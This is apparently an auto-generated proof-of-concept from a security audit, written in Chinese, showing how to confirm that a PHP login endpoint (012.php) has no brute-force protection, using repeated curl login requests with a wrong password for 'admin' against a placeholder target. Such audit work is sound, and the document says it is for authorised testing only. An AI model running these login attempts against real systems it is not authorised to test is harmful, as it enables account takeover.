# POC — 012.php 登录接口缺少暴力破解防护（CWE-307）

- finding_id: `SEM-536ee862bb25`
- type: `brute_force` / CWE-307
- severity: `high`
- file: `012.php:3`

## 步骤

1. **确认目标可达且已获授权**  
```http
curl -sS -i 'http://TARGET:8080/012'
```
预期：返回应用页面/接口响应，而不是连接失败

2. **发送第一次错误登录请求并记录状态、延迟和响应**  
```http
curl -sS -i -X GET 'http://TARGET:8080/012?Login=Login&username=admin&password=wrong'
```
预期：登录失败响应

3. **在短时间内重复 5 次以上错误登录**  
```http
curl -sS -i -X GET 'http://TARGET:8080/012?Login=Login&username=admin&password=wrong'
```
预期：无锁定、无速率限制、无递增延迟或验证码触发

## 安全说明

POC 仅为文本工件；落日二号不会执行它，也不会联网或搭建沙箱。仅限授权测试。